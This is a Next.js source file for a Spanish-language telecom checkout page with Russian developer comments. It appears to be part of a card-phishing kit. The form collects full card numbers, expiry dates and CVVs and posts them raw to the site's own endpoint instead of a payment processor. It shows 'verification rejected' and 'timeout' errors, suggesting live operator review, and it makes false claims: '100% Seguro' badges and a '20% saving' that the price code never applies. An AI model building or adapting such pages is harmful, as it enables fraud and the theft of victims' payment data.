// app/payment/page.tsx (или где у тебя лежит)
'use client';

import React, { useEffect, useState } from 'react';

export const dynamic = 'force-dynamic';

import { useCart as useTarifasCart } from '../tarifas-moviles/CartContext';
import { useCart as useFibraCart } from '../fibra-optica/CartContext';
import { useTVCart } from '../tv/CartContext';
import { useRouter, useSearchParams } from 'next/navigation';
import Header from '../tarifas-moviles/components/Header';
import Footer from '../tarifas-moviles/components/Footer';
import Image from 'next/image';

function genSessionId() {
  return `s-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`;
}

/**
 * Возвращает существующий sessionId из localStorage или создаёт новый,
 * сохраняет в localStorage и пытается зарегистрировать на сервере (/api/support/create-session).
 * Всегда возвращает строку sessionId.
 */
async function getOrCreateSessionId(): Promise<string> {
  try {
    if (typeof window === 'undefined') return genSessionId();
    const existing = localStorage.getItem('paymentSession');
    if (existing) return existing;

    const newSid = genSessionId();
    try {
      localStorage.setItem('paymentSession', newSid);
    } catch {
      // ignore
    }

    // Попытка зарегистрировать сессию на сервере (optional, idempotent)
    // Серверный эндпоинт должен быть реализован отдельно и возвращать { sessionId } или 200.
    try {
      await fetch('/api/support/create-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: newSid, initialMessage: 'User started payment flow' })
      });
    } catch (err) {
      // ignore network error — это просто fallback для локального dev
      console.warn('create-session request failed (ignored):', err);
    }

    return newSid;
  } catch {
    return genSessionId();
  }
}

function PaymentPageContent() {
  const tarifasCart = useTarifasCart();
  const fibraCart = useFibraCart();
  const tvCart = useTVCart();

  // Определяем, какая корзина активна
  const cart = tarifasCart.cart || fibraCart.cart || tvCart.cart;
  const cartType = tarifasCart.cart ? 'tarifas' : fibraCart.cart ? 'fibra' : tvCart.cart ? 'tv' : null;
  const isHydrated = tarifasCart.isHydrated && fibraCart.isHydrated && tvCart.isHydrated;

  const router = useRouter();
  const searchParams = useSearchParams();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phone: '',
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    period: '1', // 1 месяц или 12 месяцев
    agreeTerms: false
  });

  // Проверяем URL параметры для отображения ошибок
  useEffect(() => {
    const errorParam = searchParams.get('error');
    if (errorParam === 'rejected') {
      setError('Los datos proporcionados fueron rechazados. Por favor, verifica e introduce los datos correctos.');
    } else if (errorParam === 'timeout') {
      setError('El tiempo de verificación ha expirado. Por favor, intenta de nuevo.');
    }
  }, [searchParams]);

  // Показываем загрузку во время гидратации
  if (!isHydrated) {
    return (
      <>
        <Header />
        <main className="bg-gray-50 font-sans">
          <div className="container mx-auto px-4 py-6 md:py-8">
            <div className="max-w-md mx-auto text-center">
              <h1 className="text-3xl md:text-4xl font-bold text-gray-800 mb-6 md:mb-8">CARGANDO...</h1>
              <div className="tariff-card p-6">
                <div className="animate-pulse">
                  <div className="h-4 bg-gray-300 rounded w-3/4 mx-auto mb-4"></div>
                  <div className="h-4 bg-gray-300 rounded w-1/2 mx-auto"></div>
                </div>
              </div>
            </div>
          </div>
        </main>
        <Footer />
      </>
    );
  }

  // Только после гидратации проверяем корзину
  if (!cart) {
    if (typeof window !== 'undefined') {
      // Перенаправляем на соответствующую страницу в зависимости от последнего посещения
      const lastPage = localStorage.getItem('lastTariffPage') || '/tarifas-moviles';
      router.push(lastPage);
    }
    return null;
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
    }));
  };

  const formatCardNumber = (value: string) => {
    // Форматирование номера карты: XXXX XXXX XXXX XXXX
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || '';
    const parts: string[] = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setFormData(prev => ({ ...prev, cardNumber: formatted }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Проверяем, что все обязательные поля заполнены
    if (!formData.firstName || !formData.lastName || !formData.email || !formData.phone ||
      !formData.cardNumber || !formData.expiryMonth || !formData.expiryYear || !formData.cvv) {
      setError('Por favor, completa todos los campos obligatorios.');
      return;
    }

    if (!formData.agreeTerms) {
      setError('Por favor, acepta los términos y condiciones');
      return;
    }

    setLoading(true);
    setError(null);

    try {
      // ВОТ ЗДЕСЬ: НЕ генерируем каждый раз новую сессию.
      // Берём/создаём sessionId централизованно через helper
      const sessionId = await getOrCreateSessionId();

      const paymentData = {
        ...formData,
        cart,
        cartType,
        sessionId
      };

      console.log('Sending payment data:', paymentData);

      const response = await fetch('/api/send-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(paymentData),
      });

      console.log('Response status:', response.status);

      const result = await response.json().catch(() => null);
      console.log('Response result:', result);

      if (response.ok && result && result.success) {
        // sessionId уже сохранён в localStorage внутри getOrCreateSessionId()
        router.push('/processing');
      } else {
        console.error('Payment error:', result);
        const errorMessage = (result && result.error) || 'Error al procesar el pago. Inténtalo de nuevo.';
        setError(errorMessage);
        setLoading(false);
      }
    } catch (error) {
      console.error('Payment submission error:', error);
      setError('Error de conexión. Inténtalo de nuevo.');
      setLoading(false);
    }
  };

  const totalPrice = formData.period === '12'
    ? (parseFloat(String(cart.price).replace(',', '.')) * 12).toFixed(2).replace('.', ',')
    : String(cart.price);

  return (
    <>
      <Header />
      <main className="bg-gray-50 font-sans">
        <div className="container mx-auto px-4 py-6 md:py-8 pb-32">
          <h1 className="text-3xl md:text-4xl font-bold text-gray-800 mb-6 md:mb-8 text-center">PAGO SEGURO</h1>

          <div className="max-w-lg mx-auto">
            {/* Resumen del pedido */}
            <div className="tariff-card p-6 mb-6">
              <h2 className="text-xl font-bold mb-4 text-center">Resumen del pedido</h2>
              <div className="text-center mb-4">
                <div className="text-2xl font-bold text-gray-800">{cart.name}</div>
                <div className="text-gray-600">{cart.description}</div>
              </div>

              <div className="mb-4">
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Período de pago:
                </label>
                <select
                  name="period"
                  value={formData.period}
                  onChange={handleInputChange}
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent"
                >
                  <option value="1">1 mes - {String(cart.price)} €/mes</option>
                  <option value="12">12 meses - {totalPrice} € (ahorro del 20%)</option>
                </select>
              </div>

              <div className="border-t pt-4">
                <div className="flex justify-between items-center text-lg font-bold">
                  <span>Total a pagar:</span>
                  <span className="text-[#E52E8A]">{totalPrice} €</span>
                </div>
              </div>
            </div>

            {/* Formulario de pago */}
            <div className="tariff-card p-6 mb-16">
              <h2 className="text-xl font-bold mb-6 text-center">Datos de pago</h2>

              {error && (
                <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg">
                  <div className="flex items-center gap-2 text-red-700">
                    <i className="fas fa-exclamation-triangle"></i>
                    <span className="font-semibold">Error:</span>
                  </div>
                  <p className="text-red-600 text-sm mt-1">{error}</p>
                </div>
              )}

              {/* Logos de seguridad */}
              <div className="flex justify-center items-center gap-4 mb-6 p-4 bg-green-50 rounded-lg">
                <div className="flex items-center gap-2">
                  <i className="fas fa-shield-alt text-green-600 text-xl"></i>
                  <span className="text-sm font-semibold text-green-700">100% Seguro</span>
                </div>
                <div className="flex items-center gap-2">
                  <i className="fas fa-lock text-green-600 text-xl"></i>
                  <span className="text-sm font-semibold text-green-700">SSL</span>
                </div>
                <div className="flex gap-2">
                  <Image
                    src="/images/visa-svgrepo-com.svg"
                    alt="Visa"
                    width={32}
                    height={20}
                    className="rounded"
                  />
                  <Image
                    src="/images/mastercard-svgrepo-com.svg"
                    alt="Mastercard"
                    width={32}
                    height={20}
                    className="rounded"
                  />
                </div>
              </div>

              <form id="payment-form" onSubmit={handleSubmit}>
                {/* Nombre y apellidos */}
                <div className="grid grid-cols-2 gap-4 mb-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Nombre *
                    </label>
                    <input
                      type="text"
                      name="firstName"
                      value={formData.firstName}
                      onChange={handleInputChange}
                      required
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent"
                      placeholder="Nombre"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Apellidos *
                    </label>
                    <input
                      type="text"
                      name="lastName"
                      value={formData.lastName}
                      onChange={handleInputChange}
                      required
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent"
                      placeholder="Apellidos"
                    />
                  </div>
                </div>

                {/* Email */}
                <div className="mb-4">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Email *
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    required
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent"
                    placeholder="tu@email.com"
                  />
                </div>

                {/* Teléfono */}
                <div className="mb-4">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Teléfono móvil *
                  </label>
                  <input
                    type="tel"
                    name="phone"
                    value={formData.phone}
                    onChange={handleInputChange}
                    required
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent"
                    placeholder="+34 600 123 456"
                  />
                </div>

                {/* Número de tarjeta */}
                <div className="mb-4">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Número de tarjeta *
                  </label>
                  <input
                    type="text"
                    name="cardNumber"
                    value={formData.cardNumber}
                    onChange={handleCardNumberChange}
                    maxLength={19}
                    required
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent font-mono"
                    placeholder="1234 5678 9012 3456"
                  />
                </div>

                {/* Fecha de expiración и CVV */}
                <div className="grid grid-cols-3 gap-4 mb-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Mes *
                    </label>
                    <select
                      name="expiryMonth"
                      value={formData.expiryMonth}
                      onChange={handleInputChange}
                      required
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent"
                    >
                      <option value="">MM</option>
                      {Array.from({ length: 12 }, (_, i) => (
                        <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                          {String(i + 1).padStart(2, '0')}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Año *
                    </label>
                    <select
                      name="expiryYear"
                      value={formData.expiryYear}
                      onChange={handleInputChange}
                      required
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent"
                    >
                      <option value="">AA</option>
                      {Array.from({ length: 10 }, (_, i) => {
                        const year = new Date().getFullYear() + i;
                        return (
                          <option key={year} value={year.toString().slice(-2)}>
                            {year.toString().slice(-2)}
                          </option>
                        );
                      })}
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      CVV *
                    </label>
                    <input
                      type="text"
                      name="cvv"
                      value={formData.cvv}
                      onChange={handleInputChange}
                      maxLength={4}
                      required
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent font-mono text-center"
                      placeholder="123"
                    />
                  </div>
                </div>

                {/* Términos y condiciones */}
                <div className="mb-6">
                  <label className="flex items-start gap-3">
                    <input
                      type="checkbox"
                      name="agreeTerms"
                      checked={formData.agreeTerms}
                      onChange={handleInputChange}
                      required
                      className="mt-1 w-4 h-4 text-[#E52E8A] border-gray-300 rounded focus:ring-[#E52E8A]"
                    />
                    <span className="text-sm text-gray-600">
                      Acepto los{' '}
                      <a href="#" className="text-[#E52E8A] hover:underline">
                        términos y condiciones
                      </a>{' '}
                      y la{' '}
                      <a href="#" className="text-[#E52E8A] hover:underline">
                        política de privacidad
                      </a>
                    </span>
                  </label>
                </div>

              </form>

              {/* Дополнительная информация под кнопкой */}
              <div className="text-center mt-4 text-sm text-gray-500">
                <p>Al hacer clic en "CONFIRMAR PAGO", tu transacción será procesada de forma segura.</p>
              </div>
            </div>
          </div>
        </div>

        {/* Кнопка оплаты - фиксированная внизу */}
        <div className="fixed bottom-0 left-0 right-0 bg-white border-t-2 border-gray-200 shadow-2xl p-6 z-[9999]" style={{ boxShadow: '0 -10px 25px rgba(0,0,0,0.1)' }}>
          <div className="max-w-lg mx-auto">
            <button
              type="submit"
              form="payment-form"
              disabled={loading}
              className="w-full bg-gradient-to-r from-[#E52E8A] to-[#FF6B35] text-white font-bold py-5 px-8 rounded-xl hover:from-[#D1247A] hover:to-[#E55A2B] transition-all duration-300 transform hover:scale-105 shadow-xl disabled:opacity-50 disabled:cursor-not-allowed text-xl min-h-[70px] flex items-center justify-center animate-pulse"
              style={{
                background: loading ? '#ccc' : 'linear-gradient(135deg, #E52E8A 0%, #FF6B35 100%)',
                boxShadow: '0 8px 25px rgba(229, 46, 138, 0.4)',
                animation: loading ? 'none' : 'pulse 2s infinite'
              }}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-4 border-white mr-3"></div>
                  <span className="text-lg">Procesando...</span>
                </div>
              ) : (
                <div className="flex items-center justify-center">
                  <span className="text-2xl mr-2">💳</span>
                  <span className="text-xl font-bold">PAGAR {totalPrice} € AHORA</span>
                </div>
              )}
            </button>
            <div className="text-center text-sm text-gray-600 mt-3">
              🔒 Pago 100% seguro y protegido • SSL Encriptado
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}

export default function PaymentPage() {
  return <PaymentPageContent />;
}
